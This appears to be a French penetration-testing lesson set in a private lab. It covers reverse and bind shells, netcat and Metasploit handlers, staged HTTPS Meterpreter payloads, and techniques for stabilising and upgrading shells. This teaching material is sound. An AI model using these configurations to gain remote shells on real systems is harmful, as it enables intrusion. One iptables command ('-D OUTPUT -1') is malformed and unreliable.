@@ -1,0 +1,196 @@
+Une fois le payload choisi, la question devient très concrète : qui appelle qui, sur quel port, avec quel comportement si le réseau se met en travers. Cette troisième partie traite des deux formes de shell que vous rencontrerez partout, des petits amorçages qui servent à livrer la charge utile principale, du choix d'une couche de transport, et enfin de la stabilité, c'est-à-dire de l'art de garder une session ouverte le temps de faire quelque chose d'utile. C'est la partie la plus technique de la leçon, et aussi celle qui sépare une démonstration qui échoue après quinze secondes d'un travail d'exploitation réellement exploitable.
+
+Le fil conducteur est simple : chaque choix que vous prenez ici — direction de la connexion, transport, couche de session — déplace une contrainte d'un endroit à un autre. Rien n'est gratuit, rien n'est universel, et une configuration parfaite pour un lab avec des adresses fixes ne survivra pas à un réseau filtré. Nous restons dans le lab-off3, où tout est vérifiable à volonté, et les filtrages du monde réel sont simulés par des règles que vous posez vous-même sur vos propres machines.
+
+## Reverse shell ou bind shell : qui appelle qui, et pourquoi
+
+Un shell n'est, à l'essentiel, qu'un circuit : d'un côté un programme qui lit des commandes sur une entrée et écrit les résultats sur une sortie, de l'autre un canal réseau qui relie cette entrée-sortie à votre clavier et à votre écran. La seule question est celle du sens de la connexion réseau, et elle admet deux réponses. Dans un reverse shell, c'est la machine compromise qui initie la connexion vers votre écouteur : elle vous rappelle. Dans un bind shell, c'est elle qui ouvre un port en écoute et qui attend que vous vous y connectiez : elle vous attend. Tout le reste de cette section découle de cette différence.
+
+```text
+# reverse shell : la cible initie la connexion
+   cible 192.168.56.20                      machine d'attaque 192.168.56.10
+   +------------------+   connexion sortante   +---------------------------+
+   | charge utile     | =====================> | ecouteur (handler ou nc)  |
+   | executee en      |   du port 4444         | recoit commandes et       |
+   | memoire ou       | <===================== | renvoie les resultats     |
+   | service exploite |   flux bidirectionnel  |                           |
+   +------------------+                        +---------------------------+
+
+# bind shell : la cible attend la connexion
+   cible 192.168.56.20                      machine d'attaque 192.168.56.10
+   +------------------+   connexion entrante   +---------------------------+
+   | charge utile     | <===================== | client (nc ou connect)    |
+   | ouvre un port    |   du port 4444         | envoie les commandes      |
+   | et accepte       | =====================> | et lit les resultats      |
+   | les commandes    |   flux bidirectionnel  |                           |
+   +------------------+                        +---------------------------+
+```
+
+Le choix entre les deux n'est pas une préférence, il découle des filtrages en présence. Si la cible ne peut pas être atteinte de l'extérieur, parce qu'elle se trouve derrière une NAT ou devant une règle qui refuse les connexions entrantes, le bind shell est impossible et il ne reste que le reverse shell. Si la cible, inversement, ne peut pas émettre de connexions vers des adresses inconnues, parce qu'un filtrage sortant est en place, c'est le reverse shell qui échoue et le bind shell qui devient la seule option. Dans un lab, vous pouvez fabriquer les deux situations en une minute, et c'est exactement ce que nous allons faire, car comprendre une contrainte qu'on a soi-même posée est incomparablement plus formateur que la lire dans un tableau.
+
+```bash
+# sur linux-target1 : simuler un filtrage sortant strict
+sudo iptables -A OUTPUT -p tcp --dport 4444 -j DROP
+sudo iptables -L OUTPUT -n --line-numbers
+# un reverse shell vers le port 4444 echoue desormais :
+# la charge utile est executee, mais la connexion ne sort jamais.
+# pour revenir a lab-off3, annulez la regle :
+sudo iptables -D OUTPUT -1
+```
+
+Ce petit exercice produit un symptôme très instructif : la console affiche que le gestionnaire écoute, aucun message d'erreur n'apparaît, et pourtant aucune session ne s'ouvre. La faille a été déclenchée et la charge utile s'est exécutée ; c'est le canal qui n'existe pas. Beaucoup de praticiens débutants passent alors une heure à changer de module, alors que le diagnostic correct tient en une commande de vérification du trafic, à mener depuis la machine d'attaque ou depuis le poste hôte.
+
+L'écouteur, côté machine d'attaque, se prépare de deux manières. La plus simple est un outil de base de type netcat lancé en écoute sur le port choisi, qui convient parfaitement quand la charge utile envoie une commande shell brute. La plus robuste est le gestionnaire du framework, qui connaît la charge utile attendue, gère plusieurs sessions, réessaie en cas d'échec et ouvre directement une session structurée dans la console. Dans le lab-off3, nous privilégions systématiquement le gestionnaire, pour une raison pédagogique : il vous oblige à aligner payload et écouteur, ce qui est la cause n°1 des sessions qui ne s'ouvrent jamais.
+
+```bash
+# ecouteur minimal, pour une charge utile de type commande shell
+nc -lvnp 4444
+# depuis une autre fenetre, lancer l'exploitation vers 192.168.56.10:4444
+# enfin, dans msfconsole, preferer le gestionnaire qui connait la charge :
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD cmd/unix/reverse
+msf6 > set LHOST 192.168.56.10
+msf6 > set LPORT 4444
+msf6 > set ExitOnSession false
+msf6 > run -j
+```
+
+La capture réseau ci-dessous montre à quoi ressemble l'observation de ces échanges depuis la machine d'attaque : les adresses source et destination, les ports et l'ordre des paquets suffisent à déterminer qui a initié la connexion, et donc à savoir si vous êtes devant un reverse shell ou devant un bind shell. Prise avant et après chaque tentative, elle vous épargnera des diagnostics erronés.
+
+```image
+https://upload.wikimedia.org/wikipedia/commons/thumb/c/cf/Wireshark_3.6_screenshot.png/960px-Wireshark_3.6_screenshot.png
+| Interface d'analyseur réseau affichant une capture de paquets, avec les adresses et ports source et destination permettant d'établir le sens d'une connexion.
+```
+
+Le tableau suivant condamme les deux options face à face, avec la situation dans laquelle chacune s'impose et le point de vigilance qui l'accompagne.
+
+```table
+| Critère | Reverse shell | Bind shell |
+| --- | --- | --- |
+| Qui initie la connexion | La machine compromise | La machine d'attaque |
+| Filtrage entrant sur la cible | Indifférent | Bloquant |
+| Filtrage sortant sur la cible | Bloquant | Indifférent |
+| Accessibilité derrière une NAT | Possible si sortie autorisée | Impossible sans redirection |
+| Configuration de l'écouteur | Indispensable avant le lancement | Port ouvert sur la cible |
+| Détection la plus courante | Connexion sortante vers un hôte inconnu | Port inattendu en écoute |
+```
+
+Trois pièges reviennent constamment sur cette question. Le premier est l'ordre des opérations : l'écouteur doit être prêt avant le lancement, sinon la cible tente une connexion qui échoue et, selon la charge utile, ne réessaie pas. Le deuxième est l'adresse d'écoute : sur un lab multi-cartes, laisser l'écouteur sur l'adresse de bouclage alors que la charge utile vise l'adresse host-only produit un échec parfaitement silencieux. Le troisième concerne les variantes d'outils : plusieurs netcat coexistent, avec des syntaxes différentes pour l'option de port, et il faut vérifier la vôtre avant de conclure que le problème vient d'ailleurs.
+
+## Stagers et couches : la livraison de la charge utile en plusieurs temps
+
+La charge utile n'arrive presque jamais en un seul bloc, et cette mécanique de livraison est ce que la littérature appelle les stagers. Un stager est un très petit amorce, parfois de quelques dizaines d'octets, dont le seul rôle est d'ouvrir un canal et de récupérer la suite. La suite, appelée stage, est la charge utile complète, nettement plus volumineuse, qui prend le relais une fois téléchargée. Une charge utile unique, elle, embarque tout dès le départ et ne se sert de rien d'autre.
+
+Cette séparation existe pour une raison historique et technique très concrète : à certains endroits, l'espace disponible pour injecter du code est minuscule. Plutôt que de réduire indéfiniment la fonctionnalité, on injecte un petit amorçage, qui récupère le reste par la connexion déjà établie. Dans la console, la distinction se lit dans les noms : une charge utile dont l'identifiant se termine par une référence à un transport est généralement un stager, tandis qu'un identifiant long, explicite et souvent séparé par des tirets bas désigne le plus souvent une charge unique. La commande show options tranche dans tous les cas, car un stager expose les options de transport, et une charge unique, elle, expose surtout les options de comportement.
+
+```text
+# sequence de livraison en plusieurs temps
+1. le module declenche la faille et execute le STAGER (tres petit)
+2. le stager ouvre un canal vers LHOST:LPORT sur la machine d'attaque
+3. le stager demande le STAGE au gestionnaire en charge de la livraison
+4. le gestionnaire envoie la charge complete, souvent en morceaux
+5. le stage prend la main et la session s'ouvre dans la console
+# variante en un seul morceau :
+1. le module declenche la faille
+2. la charge complete s'execute et ouvre directement le canal
+3. la session s'ouvre, sans echange supplementaire
+```
+
+Le choix d'une couche repose sur trois questions, et vous devez y répondre par écrit avant de configurer quoi que ce soit. La première est de savoir si la machine d'attaque est joignable depuis la cible, et à quelle adresse : c'est la valeur de LHOST, et elle doit appartenir au segment de travail. La seconde est de savoir quel trafic traverse réellement le chemin entre les deux machines, ce que vous vérifierez avec un scan et une capture plutôt qu'en supposant. La troisième est de savoir quelle qualité de session vous devez obtenir, une commande brute suffisant parfois pour une preuve de concept, une session riche étant nécessaire pour tout ce qui touche à l'exploration.
+
+À partir de ces trois réponses, les transports disponibles se départilent sans difficulté. Le transport TCP direct est le plus simple : un seul port, un flux continu, aucune enveloppe, ce qui le rend rapide à mettre en place et facile à observer, mais également le plus visible et le plus vulnérable à un filtrage sortant. Les transports de type HTTP ou HTTPS enveloppent les échanges dans des requêtes web, ce qui leur permet de franchir des filtrages qui n'autorisent que le trafic web, de reprendre après une coupure courte et de se fondre dans le trafic ordinaire ; en contrepartie, ils sont plus lents, plus bavards et demandent une configuration soignée de l'agent utilisateur et de l'adresse de requête.
+
+```bash
+# configurer un canal de type web dans le lab-off3
+msf6 > use exploit/multi/handler
+msf6 > set PAYLOAD windows/x64/meterpreter/reverse_https
+msf6 > set LHOST 192.168.56.10
+msf6 > set LPORT 8443
+msf6 > set HttpUserAgent "Mozilla/5.0 (compatible; lab-off3)"
+msf6 > set HttpURI labcheck
+msf6 > set EnableStageEncoding true
+msf6 > set StageEncoder x64/xor_dynamic
+msf6 > set ExitOnSession false
+msf6 > run -j
+```
+
+Les options que vous venez de voir méritent d'être comprises une par une, car elles reviendront dans toutes vos configurations. L'agent utilisateur détermine l'apparence de la requête côté réseau ; l'adresse de requête détermine le chemin demandé et doit correspondre exactement à ce que le gestionnaire attend, sous peine de renvoyer une page d'erreur à la place de la charge. L'encodage de l'étape, enfin, fait transiter le stage sous une forme modifiée, puisqu'il est réassemblé et décodé sur la cible : c'est une précaution de forme, pas une garantie, et il ne faut jamais la présenter comme une protection.
+
+```table
+| Couche | Avantage principal | Inconvénient principal | Quand la choisir dans le lab |
+| --- | --- | --- | --- |
+| TCP direct | Simplicité et rapidité | Très visible, bloqué par un filtrage sortant | Réseau de lab ouvert, apprentissage |
+| HTTP | Traverse les filtrages web | Plus lent, requêtes reconnaissables | Quand seul le trafic web passe |
+| HTTPS | Mêmes avantages avec chiffrement | Certificat, diagnostic plus difficile | Quand le trafic web chiffré est admis |
+| Transport peu commun | Discrétion relative | Fragilité et maintenance limitées | Jamais pour débuter un exercice |
+```
+
+Le point le plus important de cette section est l'alignement entre la charge utile et le gestionnaire. Un stager qui s'attend à recevoir une étape ne peut pas dialoguer avec un gestionnaire configuré pour une charge unique, et l'inverse produit une session qui s'ouvre puis s'effondre, faute de pouvoir se déployer. La règle tient en trois vérifications avant le lancement : l'identifiant du payload est le même des deux côtés, l'adresse et le port d'écoute sont identiques, et la variable globale éventuellement définie précédemment a bien été effacée. Un simple show options avant chaque exploitation suffit à vérifier les trois points.
+
+Un dernier piège concerne la réutilisation des ports. Chaque lancement échoué peut laisser un écouteur en arrière-plan, et un port encore occupé fera échouer le suivant avec un message qui ne mentionne pas le vrai problème. Après chaque tentative, appelez jobs pour lister les tâches, tuez celles qui sont devenues inutiles, puis relancez. Cette hygiène, enlevée une minute par séance, vous en fait gagner vingt quand le diagnostic part dans la mauvaise direction.
+
+## Stabilité d'un shell : survivre aux premières heures
+
+Obtenir une session est un exploit ; la conserver assez longtemps pour en tirer quelque chose en est un autre. La stabilité n'est pas un confort, c'est une condition de travail : une session qui meurt pendant une commande vous fait perdre le contexte, les résultats intermédiaires et souvent la trace de ce que vous étiez en train de démontrer. Nous examinons ici les causes réelles de décès des sessions, les gestes qui les préviennent et la manière de diagnostiquer une session qui rame.
+
+Les causes sont plus ordinaires qu'on ne le croit. Une charge utile attachée à un processus éphémère disparaît quand ce processus se termine, typiquement à la fin d'une requête web. Un redémarrage, une mise en veille ou un changement de réseau de la machine hôte coupe le canal sans prévenir. Une interruption clavier envoyée par erreur dans la console se propage à la session et termine le processus. Un terminal mal dimensionné, une locale inadéquate ou un encodage de caractères absent rendent la session inutilisable sans pour autant l'avoir tuée. Enfin, un filtrage qui coupe les connexions longues laisse la session s'afficher comme active alors qu'elle est déjà morte.
+
+Le premier réflexe est structurel : ne jamais travailler avec l'écouteur comme processus d'un terminal que vous pourriez refermer. Lancez le gestionnaire en tâche de fond dans la console, avec l'option -j, et faites tourner la console elle-même dans un multiplexeur de terminal ou dans une session détachée. Un poste hôte qui se met en veille, une fenêtre fermée par mégarde ou une mise à jour du poste qui redémarre sont les trois causes les plus fréquentes de perte de session, et toutes trois relèvent de cette seule précaution.
+
+```bash
+# proteger l'ecouteur et la console contre la refermeture d'une fenetre
+tmux new -s lab-off3
+msfconsole -q
+# puis, dans la console, lancer en tache de fond et detacher la session
+msf6 > exploit -j
+msf6 > background
+# reverifier apres chaque tentative : jobs pour les ecouteurs, sessions pour les canaux
+msf6 > jobs
+msf6 > sessions -l
+```
+
+Le deuxième réflexe concerne la qualité de la session brute. Un shell obtenu par une charge minimale n'a ni terminal, ni historique, ni taille de fenêtre correcte : les programmes interactifs s'affichent en vrac, les flèches du clavier sont interprétées comme des caractères bruts et le défilement devient confus. On lui donne un vrai terminal en plusieurs étapes, d'abord sur la cible avec un interpréteur de commande dédié, puis sur la machine d'attaque en alignant la taille et la variable d'environnement. L'opération est une routine standard dans le métier, et elle se déroule toujours dans le même ordre.
+
+```text
+# donner un vrai terminal a un shell brut (depuis la session ouverte)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# puis, sans fermer la session : Ctrl+Z pour arreter le processus local
+# sur la machine d'attaque :
+stty raw -echo
+fg
+# enfin, sur la cible, aligner la taille et l'environnement :
+stty rows 40 columns 120
+export TERM=xterm-256color
+export LANG=C.UTF-8
+reset
+```
+
+Le troisième réflexe consiste à rendre la session résistante à la mort du processus qui la porte. Deux techniques suffisent dans la majorité des cas. La première consiste à faire migrer la session vers un processus stable dès son ouverture, ce que le gestionnaire sait faire automatiquement si vous lui en donnez l'ordre. La seconde consiste, sur une session de type commande, à la convertir en une session plus riche, capable de survivre à un terminal fermé et de poursuivre son travail. Dans les deux cas, la configuration se fait avant le lancement, car une session déjà ouverte ne se stabilise pas rétroactivement.
+
+```bash
+# avant le lancement : demander la migration automatique des sessions
+msf6 > set AutoRunScript migrate -f
+msf6 > set ExitOnSession false
+msf6 > exploit -j
+# apres coup, sur une session brute deja ouverte :
+msf6 > sessions -u 1
+msf6 > use post/multi/manage/shell_to_meterpreter
+msf6 > set SESSION 1
+msf6 > set LHOST 192.168.56.10
+msf6 > run
+```
+
+Il faut enfin savoir diagnostiquer une session qui rame ou qui semble figée, car les deux situations n'ont pas les mêmes causes. Une session lente mais vivante signale le plus souvent un transport peu adapté, une session totalement muette signale un canal coupé, et une session qui répond par intermittence signale un processus en fin de vie ou un filtrage qui détruit les connexions longues. La capture du trafic sur le segment tranche dans tous les cas : si des paquets continuent de circuler, le problème est côté interprétation ; s'ils cessent, le problème est réseau ; s'ils ne sont jamais partis, le problème est la configuration de l'écouteur.
+
+```table
+| Symptôme observé | Cause probable | Geste correcteur |
+| --- | --- | --- |
+| Session morte après la première commande | Processus éphémère porteur de la charge | Migration automatique dès l'ouverture |
+| Caractères bizarres et affichage éclaté | Terminal brut et taille non alignée | Interpréteur dédié puis alignement |
+| Session figée après veille du poste | Canal réseau interrompu | Console dans un multiplexeur, puis relance |
+| Session qui répond au bout de plusieurs secondes | Transport peu adapté au chemin | Basculer vers une couche plus résistante |
+| Rien ne s'affiche mais des paquets circulent | Problème d'encodage ou de locale | Variables d'environnement réalignées |
+| Échec au deuxième lancement | Écouteur oublié en tâche de fond | jobs, nettoyage, puis relance |
+```
+
+Un mot pour finir sur la documentation de ces incidents. Notez, chaque fois qu'une session tombe, l'heure, la commande en cours, le transport utilisé et l'état du réseau au moment précis. Ces quelques lignes, prises sur le moment, constituent la matière première de la section suivante : elles sont ce qui vous permettra de distinguer une faille de votre chaîne d'exploitation d'un défaut de votre laboratoire, et cette distinction est exactement ce qu'un décideur attend de vous quand vous présenterez vos conclusions.
